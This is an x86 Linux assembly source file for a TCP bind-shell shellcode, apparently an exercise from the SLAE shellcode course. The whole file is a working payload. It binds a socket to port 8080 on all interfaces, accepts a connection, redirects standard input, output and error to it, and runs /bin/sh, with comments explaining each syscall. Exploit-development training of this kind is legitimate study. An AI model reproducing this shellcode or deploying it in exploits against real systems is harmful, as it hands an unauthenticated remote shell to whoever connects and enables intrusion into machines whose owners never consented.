; shell_bind_tcp.nasm
; 
; A TCP port bind shellcode
;
; Author: SLAE - 891
;
; You are free to use and/or redistribute it without restriction

global  _start

section .text
_start:

; sockfd = socket(AF_INET, SOCK_STREAM, 0);
; int socketcall(int call, unsigned long *args);
; #define __NR_socketcall   102
; #define SYS_SOCKET        1
    xor ebx,ebx
    mul ebx         ; zero out eax and edx
    mov al, 102     ; __NR_socketcall
    mov bl, 1       ; SYS_SOCKET
    
    ; we are pushing on the stack our arguments
    push edx        ; IPPROTO_IP
    push byte 1     ; SOCK_STREAM
    push byte 2     ; AF_INET
    
    mov ecx, esp    ; the top of the stack points to a structure of 3 arguments
    int 0x80        ; syscall - result is stored in eax
    mov edi, eax    ; stores sockfd

; bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
; int socketcall(int call, unsigned long *args);
; #define __NR_socketcall   102
; #define SYS_BIND          2
    push edx        ; mysockaddr.sin_addr.s_addr = INADDR_ANY; //0 - listen on 0.0.0.0 (all interfaces)
    push word 0x901f  ; mysockaddr.sin_port = htons(dstport); //8080
    push word 2     ; AF_INET
    mov ebx, esp    ; stores the address of mysockaddr
    push byte 16    ; length of mysockaddr
    push ebx        ; pointer to mysockaddr
    push edi        ; sockfd

    xor ebx, ebx    ; flushing registers
    mul ebx
    mov al, 102     ; __NR_socketcall
    mov bl, 2       ; SYS_BIND
    mov ecx, esp    ; pointer to the args for socketcall
    int 0x80


; listen(sockfd, 0);
; int socketcall(int call, unsigned long *args);
; #define __NR_socketcall   102
; #define SYS_LISTEN        4
    push edx        ; 0
    push edi        ; sockfd
    xor ebx, ebx    ; flushing registers
    mul ebx
    mov al, 102     ; __NR_socketcall
    mov bl, 4       ; SYS_LISTEN
    mov ecx, esp    ; pointer to the args for socketcall
    int 0x80 


; clientfd = accept(sockfd, NULL, NULL);
; int socketcall(int call, unsigned long *args);
; #define __NR_socketcall   102
; #define SYS_ACCEPT        5
    xor ebx, ebx    ; flushing registers
    mul ebx

    push edx        ; NULL
    push edx        ; NULL
    push edi        ; sockfd

    mov al, 102     ; __NR_socketcall
    mov bl, 5       ; SYS_ACCEPT
    mov ecx, esp    ; pointer to args
    int 0x80        ; returns clientfd file descriptor in eax

; int dup2(int oldfd, int newfd); duplicates a file descriptor
; dup2(clientfd, 0); 
; dup2(clientfd, 1);
; dup2(clientfd, 2);
; #define __NR_dup2 63

    mov ebx, eax    ; clientfd as first argument
    xor ecx, ecx
    mov cl, 2       ; 2 for stderr / 1 for stdout / 0 for stdin
    xor eax, eax

dup2:
    mov al, 63      ; __NR_dup2
    int 0x80
    dec ecx
    jns dup2        ; jump short if not signed 

; execve("/bin/sh", NULL, NULL);
; #define __NR_execve 11

    xor eax,eax
    push eax
    push 0x68732f2f ; hs// - take care to the little endian representation
    push 0x6e69622f ; nib/
    mov ebx, esp    ; pointer to command string
    mov ecx, eax
    mov edx, eax
    mov al, 11      ; __NR_execve
    int 0x80
